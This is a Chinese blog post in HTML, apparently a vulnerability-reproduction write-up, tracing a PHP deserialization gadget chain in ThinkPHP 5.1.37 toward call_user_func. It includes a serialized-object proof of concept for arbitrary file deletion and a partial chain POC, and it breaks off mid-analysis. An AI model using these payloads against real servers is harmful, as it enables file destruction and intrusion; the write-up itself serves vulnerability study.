@@ -1,0 +1,1019 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='go!'><title>thinkphp5.1.* - 反序列化</title>
+
+<link rel='canonical' href='https://coollllllll.github.io/p/php-5/'>
+
+<link rel="stylesheet" href="/scss/style.min.css"><meta property='og:title' content='thinkphp5.1.* - 反序列化'>
+<meta property='og:description' content='go!'>
+<meta property='og:url' content='https://coollllllll.github.io/p/php-5/'>
+<meta property='og:site_name' content='cOOl &#39;s blog'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2020-10-09T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2020-10-09T00:00:00&#43;00:00'/><meta property='og:image' content='https://coollllllll.github.io/p/php-5/pawel-czerwinski-8uZPynIu-rQ-unsplash.jpg' />
+<meta name="twitter:title" content="thinkphp5.1.* - 反序列化">
+<meta name="twitter:description" content="go!"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://coollllllll.github.io/p/php-5/pawel-czerwinski-8uZPynIu-rQ-unsplash.jpg' />
+    </head>
+    <body class="
+    article-page has-toc
+">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex 
+    
+        extended
+    
+">
+    
+        <div id="article-toolbar">
+            <a href="/" class="back-home">
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="15 6 9 12 15 18" />
+</svg>
+
+
+
+                <span>返回</span>
+            </a>
+        </div>
+    
+<main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/p/php-5/">
+                <img src="/p/php-5/pawel-czerwinski-8uZPynIu-rQ-unsplash_hud7e36f7e20e71be184458283bdae4646_55974_800x0_resize_q75_box.jpg"
+                        srcset="/p/php-5/pawel-czerwinski-8uZPynIu-rQ-unsplash_hud7e36f7e20e71be184458283bdae4646_55974_800x0_resize_q75_box.jpg 800w, /p/php-5/pawel-czerwinski-8uZPynIu-rQ-unsplash_hud7e36f7e20e71be184458283bdae4646_55974_1600x0_resize_q75_box.jpg 1600w"
+                        width="800" 
+                        height="534" 
+                        loading="lazy"
+                        alt="Featured image of post thinkphp5.1.* - 反序列化" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" style="background-color: #2a9d8f; color: #fff;">
+                漏洞复现
+            </a>
+        
+    </header>
+    
+
+    <h2 class="article-title">
+        <a href="/p/php-5/">thinkphp5.1.* - 反序列化</a>
+    </h2>
+
+    
+    <h3 class="article-subtitle">
+        go!
+    </h3>
+    
+
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Oct 09, 2020</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 10 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+</div>
+</header>
+
+    <section class="article-content">
+    <h1 id="thinkphp51---反序列化">thinkphp5.1.* - 反序列化</h1>
+<h2 id="环境">环境</h2>
+<p>thinkphp-5.1.37</p>
+<p>PHP 7.0.33</p>
+<h2 id="反序列化触发链">反序列化触发链</h2>
+<ul>
+<li>全局搜索<code>__destruct()</code>关键字，找到漏洞的起点：</li>
+</ul>
+<p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 153; 
+			flex-basis: 367px"
+	>
+	<a href="/p/php-5/image-20220222151402276.png" data-size="601x392">
+		<img src="/p/php-5/image-20220222151402276.png"
+			width="601"
+			height="392"
+			srcset="/p/php-5/image-20220222151402276_hu7ccc03757c84467b806a609e272e9f8a_37203_480x0_resize_box_3.png 480w, /p/php-5/image-20220222151402276_hu7ccc03757c84467b806a609e272e9f8a_37203_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<ul>
+<li>跟进<code>removeFiles()</code></li>
+</ul>
+<p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 150; 
+			flex-basis: 360px"
+	>
+	<a href="/p/php-5/image-20220222151808921.png" data-size="416x277">
+		<img src="/p/php-5/image-20220222151808921.png"
+			width="416"
+			height="277"
+			srcset="/p/php-5/image-20220222151808921_hu435cd865cedf380a600b467c82f647e1_22267_480x0_resize_box_3.png 480w, /p/php-5/image-20220222151808921_hu435cd865cedf380a600b467c82f647e1_22267_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<p>发现$this-&gt;files变量，而该removeFiles函数的功能就是删除文件，因此只要有反序列化点，就可实现任意文件删除，POC如下：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
+<span class="k">namespace</span> <span class="nx">think\process\pipes</span><span class="p">;</span>
+<span class="k">abstract</span> <span class="k">class</span> <span class="nc">Pipes</span>
+<span class="p">{</span>
+
+<span class="p">}</span>
+
+<span class="k">class</span> <span class="nc">Windows</span> <span class="k">extends</span> <span class="nx">Pipes</span>
+<span class="p">{</span>
+    <span class="k">private</span> <span class="nv">$files</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&#34;test.txt&#34;</span><span class="p">];</span>
+<span class="p">}</span>
+<span class="k">echo</span> <span class="nx">base64_encode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="k">new</span> <span class="nx">Windows</span><span class="p">()));</span>
+<span class="cp">?&gt;</span><span class="err">
+</span></code></pre></div><ul>
+<li><code>removeFiles()</code>中使用了<code>file_exists</code>对<code>$filename</code>进行处理。<code>file_exists</code>函数种<code>$filename</code>会被作为字符串处理，那么如果filename是某个类对象，就会触发<code>__toString</code>方法。</li>
+<li>全局搜索<code>__toString</code>，发现Conversion类种存在如下:</li>
+</ul>
+<p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 294; 
+			flex-basis: 706px"
+	>
+	<a href="/p/php-5/image-20220222152706447.png" data-size="592x201">
+		<img src="/p/php-5/image-20220222152706447.png"
+			width="592"
+			height="201"
+			srcset="/p/php-5/image-20220222152706447_hu7d005f1d5300363cd400fb530025e1ce_21175_480x0_resize_box_3.png 480w, /p/php-5/image-20220222152706447_hu7d005f1d5300363cd400fb530025e1ce_21175_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<ul>
+<li>跟进<code>toJson()</code>：</li>
+</ul>
+<pre tabindex="0"><code>/**
+     * 转换当前模型对象为JSON字符串
+     * @access public
+     * @param  integer $options json参数
+     * @return string
+     */
+    public function toJson($options = JSON_UNESCAPED_UNICODE)
+    {
+        return json_encode($this-&gt;toArray(), $options);
+    }
+</code></pre><ul>
+<li>跟进<code>toArray()</code>:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="sd">/**
+</span><span class="sd">     * 转换当前模型对象为数组
+</span><span class="sd">     * @access public
+</span><span class="sd">     * @return array
+</span><span class="sd">     */</span>
+    <span class="k">public</span> <span class="k">function</span> <span class="nf">toArray</span><span class="p">()</span>
+    <span class="p">{</span>
+        <span class="o">....</span>
+        <span class="c1">// 追加属性（必须定义获取器）
+</span><span class="c1"></span>        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">append</span><span class="p">))</span> <span class="p">{</span>
+            <span class="k">foreach</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">append</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="nv">$name</span><span class="p">)</span> <span class="p">{</span>
+                <span class="k">if</span> <span class="p">(</span><span class="nx">is_array</span><span class="p">(</span><span class="nv">$name</span><span class="p">))</span> <span class="p">{</span>
+                    <span class="c1">// 追加关联对象属性
+</span><span class="c1"></span>                    <span class="nv">$relation</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">getRelation</span><span class="p">(</span><span class="nv">$key</span><span class="p">);</span>
+
+                    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$relation</span><span class="p">)</span> <span class="p">{</span>
+                        <span class="nv">$relation</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">getAttr</span><span class="p">(</span><span class="nv">$key</span><span class="p">);</span>
+                        <span class="k">if</span> <span class="p">(</span><span class="nv">$relation</span><span class="p">)</span> <span class="p">{</span>
+                            <span class="nv">$relation</span><span class="o">-&gt;</span><span class="na">visible</span><span class="p">(</span><span class="nv">$name</span><span class="p">);</span>
+                        <span class="p">}</span>
+                    <span class="p">}</span>
+
+                    <span class="nv">$item</span><span class="p">[</span><span class="nv">$key</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$relation</span> <span class="o">?</span> <span class="nv">$relation</span><span class="o">-&gt;</span><span class="na">append</span><span class="p">(</span><span class="nv">$name</span><span class="p">)</span><span class="o">-&gt;</span><span class="na">toArray</span><span class="p">()</span> <span class="o">:</span> <span class="p">[];</span>
+                <span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="nx">strpos</span><span class="p">(</span><span class="nv">$name</span><span class="p">,</span> <span class="s1">&#39;.&#39;</span><span class="p">))</span> <span class="p">{</span>
+                    <span class="k">list</span><span class="p">(</span><span class="nv">$key</span><span class="p">,</span> <span class="nv">$attr</span><span class="p">)</span> <span class="o">=</span> <span class="nx">explode</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">,</span> <span class="nv">$name</span><span class="p">);</span>
+                    <span class="c1">// 追加关联对象属性
+</span><span class="c1"></span>                    <span class="nv">$relation</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">getRelation</span><span class="p">(</span><span class="nv">$key</span><span class="p">);</span>
+
+                    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$relation</span><span class="p">)</span> <span class="p">{</span>
+                        <span class="nv">$relation</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">getAttr</span><span class="p">(</span><span class="nv">$key</span><span class="p">);</span>
+                        <span class="k">if</span> <span class="p">(</span><span class="nv">$relation</span><span class="p">)</span> <span class="p">{</span>
+                            <span class="nv">$relation</span><span class="o">-&gt;</span><span class="na">visible</span><span class="p">([</span><span class="nv">$attr</span><span class="p">]);</span>
+                        <span class="p">}</span>
+                    <span class="p">}</span>
+
+                    <span class="nv">$item</span><span class="p">[</span><span class="nv">$key</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$relation</span> <span class="o">?</span> <span class="nv">$relation</span><span class="o">-&gt;</span><span class="na">append</span><span class="p">([</span><span class="nv">$attr</span><span class="p">])</span><span class="o">-&gt;</span><span class="na">toArray</span><span class="p">()</span> <span class="o">:</span> <span class="p">[];</span>
+                <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+                    <span class="nv">$item</span><span class="p">[</span><span class="nv">$name</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">getAttr</span><span class="p">(</span><span class="nv">$name</span><span class="p">,</span> <span class="nv">$item</span><span class="p">);</span>
+                <span class="p">}</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+
+        <span class="k">return</span> <span class="nv">$item</span><span class="p">;</span>
+    <span class="p">}</span>
+</code></pre></div><p>注意到了<code>$relation-&gt;visible($name)</code>，调用<code>$relation</code>变量的visible方法，参数为<code>$name</code>，而name是从<code>$this-&gt;append</code>取出来的，而<code>$this-&gt;append</code>我们可以通过自定义属性进行控制，那么name就可控，当<code>$relation</code>也可控的话，令其为某个类对象，当调用visible方法不存在时，则会触发该类对象的<code>__call</code>方法。</p>
+<p>接下来就是寻找如何控制<code>$relation</code>。</p>
+<ul>
+<li>跟进<code>$this-&gt;getRelation</code>:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="sd">/**
+</span><span class="sd">     * 获取当前模型的关联模型数据
+</span><span class="sd">     * @access public
+</span><span class="sd">     * @param  string $name 关联方法名
+</span><span class="sd">     * @return mixed
+</span><span class="sd">     */</span>
+    <span class="k">public</span> <span class="k">function</span> <span class="nf">getRelation</span><span class="p">(</span><span class="nv">$name</span> <span class="o">=</span> <span class="k">null</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nx">is_null</span><span class="p">(</span><span class="nv">$name</span><span class="p">))</span> <span class="p">{</span>
+            <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">relation</span><span class="p">;</span>
+        <span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="nx">array_key_exists</span><span class="p">(</span><span class="nv">$name</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">relation</span><span class="p">))</span> <span class="p">{</span>
+            <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">relation</span><span class="p">[</span><span class="nv">$name</span><span class="p">];</span>
+        <span class="p">}</span>
+        <span class="k">return</span><span class="p">;</span>
+    <span class="p">}</span>
+</code></pre></div><p>发现可以直接return，而且后续判断语句为<code>if (!$relation)</code>，所以可继续跟进。</p>
+<ul>
+<li>跟进<code>$this-&gt;getAttr</code>，进入<code>Attribute</code>类:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="sd">/**
+</span><span class="sd">     * 获取器 获取数据对象的值
+</span><span class="sd">     * @access public
+</span><span class="sd">     * @param  string $name 名称
+</span><span class="sd">     * @param  array  $item 数据
+</span><span class="sd">     * @return mixed
+</span><span class="sd">     * @throws InvalidArgumentException
+</span><span class="sd">     */</span>
+    <span class="k">public</span> <span class="k">function</span> <span class="nf">getAttr</span><span class="p">(</span><span class="nv">$name</span><span class="p">,</span> <span class="o">&amp;</span><span class="nv">$item</span> <span class="o">=</span> <span class="k">null</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="k">try</span> <span class="p">{</span>
+            <span class="nv">$notFound</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
+            <span class="nv">$value</span>    <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">getData</span><span class="p">(</span><span class="nv">$name</span><span class="p">);</span>
+        <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">InvalidArgumentException</span> <span class="nv">$e</span><span class="p">)</span> <span class="p">{</span>
+            <span class="nv">$notFound</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
+            <span class="nv">$value</span>    <span class="o">=</span> <span class="k">null</span><span class="p">;</span>
+        <span class="p">}</span>
+
+      <span class="o">...</span>
+
+        <span class="k">return</span> <span class="nv">$value</span><span class="p">;</span>
+    <span class="p">}</span>
+</code></pre></div><ul>
+<li>返回值由<code>$this-&gt;getData</code>确定，跟进该方法：</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="sd">/**
+</span><span class="sd">     * 获取对象原始数据 如果不存在指定字段返回false
+</span><span class="sd">     * @access public
+</span><span class="sd">     * @param  string $name 字段名 留空获取全部
+</span><span class="sd">     * @return mixed
+</span><span class="sd">     * @throws InvalidArgumentException
+</span><span class="sd">     */</span>
+    <span class="k">public</span> <span class="k">function</span> <span class="nf">getData</span><span class="p">(</span><span class="nv">$name</span> <span class="o">=</span> <span class="k">null</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nx">is_null</span><span class="p">(</span><span class="nv">$name</span><span class="p">))</span> <span class="p">{</span>
+            <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">data</span><span class="p">;</span>
+        <span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="nx">array_key_exists</span><span class="p">(</span><span class="nv">$name</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">data</span><span class="p">))</span> <span class="p">{</span>
+            <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">data</span><span class="p">[</span><span class="nv">$name</span><span class="p">];</span>
+        <span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="nx">array_key_exists</span><span class="p">(</span><span class="nv">$name</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">relation</span><span class="p">))</span> <span class="p">{</span>
+            <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">relation</span><span class="p">[</span><span class="nv">$name</span><span class="p">];</span>
+        <span class="p">}</span>
+        <span class="k">throw</span> <span class="k">new</span> <span class="nx">InvalidArgumentException</span><span class="p">(</span><span class="s1">&#39;property not exists:&#39;</span> <span class="o">.</span> <span class="k">static</span><span class="o">::</span><span class="na">class</span> <span class="o">.</span> <span class="s1">&#39;-&gt;&#39;</span> <span class="o">.</span> <span class="nv">$name</span><span class="p">);</span>
+    <span class="p">}</span>
+</code></pre></div><p>发现：其值可以由<code>$this-&gt;data[$name]</code>确定，那么我们可以控制Attribute类属性data值，且$this-&gt;data[$name]的键<code>name</code>是由最初append中的key决定的，也是我们可控的，所以我们可以控制<code>$relation</code>。</p>
+<ul>
+<li>梳理反序列化触发链：</li>
+</ul>
+<pre tabindex="0"><code># Windwos类
+__dustruct &gt; removeFiles() &gt; file_exists($filename) &gt; $filename可控 触发__toString()
+
+# Conversion类
+__toString() &gt; toJson() &gt; toArray() &gt; $relation-&gt;visible($name)  &gt; $relation可控和$name可控 触发__call()
+
+# $name可控
+从Conversion类的append属性中读取，所以可控
+
+# $relation可控
+Attribute类中getAttr($key) &gt; getData($name) &gt; $data[$name]
+其中data为Attribute类属性，键$name可由append控制，所以可控
+</code></pre><blockquote>
+<p>发现<code>Conversion</code>和<code>Attribute</code>为trait类：</p>
+<p>自 PHP 5.4.0 起，PHP 实现了一种代码复用的方法，称为 <code>trait</code>。通过在类中使用<code>use</code> 关键字，声明要组合的Trait名称。所以，这里类的继承要使用<code>use</code>关键字。</p>
+<p>trait类不能实例化，所以要找一个同时继承<code>Attribute</code>类和<code>Conversion</code>类的子类。</p>
+</blockquote>
+<ul>
+<li>全局搜索<code>Attribute</code>，找到了Model类：</li>
+</ul>
+<p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 147; 
+			flex-basis: 354px"
+	>
+	<a href="/p/php-5/image-20220222161601996.png" data-size="596x404">
+		<img src="/p/php-5/image-20220222161601996.png"
+			width="596"
+			height="404"
+			srcset="/p/php-5/image-20220222161601996_hu7cd6e64b6df639e02e075f98462d7490_55479_480x0_resize_box_3.png 480w, /p/php-5/image-20220222161601996_hu7cd6e64b6df639e02e075f98462d7490_55479_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<ul>
+<li>总计目前的利用POC：</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="k">namespace</span> <span class="nx">think</span><span class="p">;</span>
+<span class="k">abstract</span> <span class="k">class</span> <span class="nc">Model</span><span class="p">{</span>
+    <span class="k">protected</span> <span class="nv">$append</span> <span class="o">=</span> <span class="p">[];</span>
+    <span class="k">private</span> <span class="nv">$data</span> <span class="o">=</span> <span class="p">[];</span>
+    <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">append</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&#34;haha&#34;</span><span class="o">=&gt;</span><span class="p">[]];</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">data</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&#34;haha&#34;</span><span class="o">=&gt;</span><span class="k">new</span> <span class="nx">A</span><span class="p">()];</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div><p>接下来就是寻找A类，该类要么是存在visible方法且里面有敏感函数可以直接让我们利用，要么就是没有visible方法但存在__call()方法可让我们利用。</p>
+<h2 id="敏感函数执行链">敏感函数执行链</h2>
+<ul>
+<li>
+<p>全局搜索<code>visible</code>，发现没有什么可利用的。</p>
+</li>
+<li>
+<p>全局搜索<code>__call()</code>：</p>
+</li>
+</ul>
+<p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 191; 
+			flex-basis: 459px"
+	>
+	<a href="/p/php-5/image-20220222162730444.png" data-size="876x458">
+		<img src="/p/php-5/image-20220222162730444.png"
+			width="876"
+			height="458"
+			srcset="/p/php-5/image-20220222162730444_hucf5e35a72c812fc60e829e79fdb7ba0f_80949_480x0_resize_box_3.png 480w, /p/php-5/image-20220222162730444_hucf5e35a72c812fc60e829e79fdb7ba0f_80949_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<p>最终在<code>Request.php</code>中找到一个<code>__call</code>方法，且其中存在<code>call_user_func_array</code>，且参数<code>$this-&gt;hook</code>是可控的，<code>$args</code>也是我们可控的(之前的反序列化触发链)。但是<code>array_unshift</code>会在<code>$args</code>头中插入$this，导致无法构造任意内容。</p>
+<p>因此，要找到另一个函数，让它被这里的<code>call_user_func_array</code>调用，但是它对所需的参数无严格要求，且最终也能触发敏感函数。</p>
+<p>thinkphp中有多个远程代码执行洞都有一个filter覆盖的问题，所以尝试从这里入手。</p>
+<ul>
+<li>找<code>filterValue</code>：</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="sd">/**
+</span><span class="sd">     * 递归过滤给定的值
+</span><span class="sd">     * @access public
+</span><span class="sd">     * @param  mixed     $value 键值
+</span><span class="sd">     * @param  mixed     $key 键名
+</span><span class="sd">     * @param  array     $filters 过滤方法+默认值
+</span><span class="sd">     * @return mixed
+</span><span class="sd">     */</span>
+    <span class="k">private</span> <span class="k">function</span> <span class="nf">filterValue</span><span class="p">(</span><span class="o">&amp;</span><span class="nv">$value</span><span class="p">,</span> <span class="nv">$key</span><span class="p">,</span> <span class="nv">$filters</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="nv">$default</span> <span class="o">=</span> <span class="nx">array_pop</span><span class="p">(</span><span class="nv">$filters</span><span class="p">);</span>
+
+        <span class="k">foreach</span> <span class="p">(</span><span class="nv">$filters</span> <span class="k">as</span> <span class="nv">$filter</span><span class="p">)</span> <span class="p">{</span>
+            <span class="k">if</span> <span class="p">(</span><span class="nx">is_callable</span><span class="p">(</span><span class="nv">$filter</span><span class="p">))</span> <span class="p">{</span>
+                <span class="c1">// 调用函数或者方法过滤
+</span><span class="c1"></span>                <span class="nv">$value</span> <span class="o">=</span> <span class="nx">call_user_func</span><span class="p">(</span><span class="nv">$filter</span><span class="p">,</span> <span class="nv">$value</span><span class="p">);</span>
+            <span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="nx">is_scalar</span><span class="p">(</span><span class="nv">$value</span><span class="p">))</span> <span class="p">{</span>
+                <span class="o">....</span>
+        <span class="p">}</span>
+
+        <span class="k">return</span> <span class="nv">$value</span><span class="p">;</span>
+    <span class="p">}</span>
+</code></pre></div><p>存在<code>call_user_func</code>敏感函数，往上找看<code>$filters</code>和<code>$$value</code>是否可控。</p>
+<ul>
+<li>找到<code>input</code>：</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="sd">/**
+</span><span class="sd">     * 获取变量 支持过滤和默认值
+</span><span class="sd">     * @access public
+</span><span class="sd">     * @param  array         $data 数据源
+</span><span class="sd">     * @param  string|false  $name 字段名
+</span><span class="sd">     * @param  mixed         $default 默认值
+</span><span class="sd">     * @param  string|array  $filter 过滤函数
+</span><span class="sd">     * @return mixed
+</span><span class="sd">     */</span>
+    <span class="k">public</span> <span class="k">function</span> <span class="nf">input</span><span class="p">(</span><span class="nv">$data</span> <span class="o">=</span> <span class="p">[],</span> <span class="nv">$name</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$default</span> <span class="o">=</span> <span class="k">null</span><span class="p">,</span> <span class="nv">$filter</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="k">false</span> <span class="o">===</span> <span class="nv">$name</span><span class="p">)</span> <span class="p">{</span>
+            <span class="c1">// 获取原始数据
+</span><span class="c1"></span>            <span class="k">return</span> <span class="nv">$data</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="k">if</span> <span class="p">(</span><span class="s1">&#39;&#39;</span> <span class="o">!=</span> <span class="nv">$name</span><span class="p">)</span> <span class="p">{</span>
+            <span class="c1">// 解析name
+</span><span class="c1"></span>            <span class="k">if</span> <span class="p">(</span><span class="nx">strpos</span><span class="p">(</span><span class="nv">$name</span><span class="p">,</span> <span class="s1">&#39;/&#39;</span><span class="p">))</span> <span class="p">{</span>
+                <span class="k">list</span><span class="p">(</span><span class="nv">$name</span><span class="p">,</span> <span class="nv">$type</span><span class="p">)</span> <span class="o">=</span> <span class="nx">explode</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="nv">$name</span><span class="p">);</span>
+            <span class="p">}</span>
+
+            <span class="nv">$data</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">getData</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span> <span class="nv">$name</span><span class="p">);</span>
+
+            <span class="k">if</span> <span class="p">(</span><span class="nx">is_null</span><span class="p">(</span><span class="nv">$data</span><span class="p">))</span> <span class="p">{</span>
+                <span class="k">return</span> <span class="nv">$default</span><span class="p">;</span>
+            <span class="p">}</span>
+
+            <span class="k">if</span> <span class="p">(</span><span class="nx">is_object</span><span class="p">(</span><span class="nv">$data</span><span class="p">))</span> <span class="p">{</span>
+                <span class="k">return</span> <span class="nv">$data</span><span class="p">;</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+        <span class="c1">// 解析过滤器
+</span><span class="c1"></span>        <span class="nv">$filter</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">getFilter</span><span class="p">(</span><span class="nv">$filter</span><span class="p">,</span> <span class="nv">$default</span><span class="p">);</span>
+
+        <span class="k">if</span> <span class="p">(</span><span class="nx">is_array</span><span class="p">(</span><span class="nv">$data</span><span class="p">))</span> <span class="p">{</span>
+            <span class="nx">array_walk_recursive</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span> <span class="p">[</span><span class="nv">$this</span><span class="p">,</span> <span class="s1">&#39;filterValue&#39;</span><span class="p">],</span> <span class="nv">$filter</span><span class="p">);</span>
+            <span class="k">if</span> <span class="p">(</span><span class="nx">version_compare</span><span class="p">(</span><span class="k">PHP_VERSION</span><span class="p">,</span> <span class="s1">&#39;7.1.0&#39;</span><span class="p">,</span> <span class="s1">&#39;&lt;&#39;</span><span class="p">))</span> <span class="p">{</span>
+                <span class="c1">// 恢复PHP版本低于 7.1 时 array_walk_recursive 中消耗的内部指针
+</span><span class="c1"></span>                <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">arrayReset</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
+            <span class="p">}</span>
+        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">filterValue</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span> <span class="nv">$name</span><span class="p">,</span> <span class="nv">$filter</span><span class="p">);</span>
+        <span class="p">}</span>
+		<span class="o">....</span>
+        <span class="k">return</span> <span class="nv">$data</span><span class="p">;</span>
+    <span class="p">}</span>
+</code></pre></div><p>会调用filterValue，需要继续往上找，看<code>$filter</code>、<code>$data</code>和<code>$name</code>能否可控。</p>
+<ul>
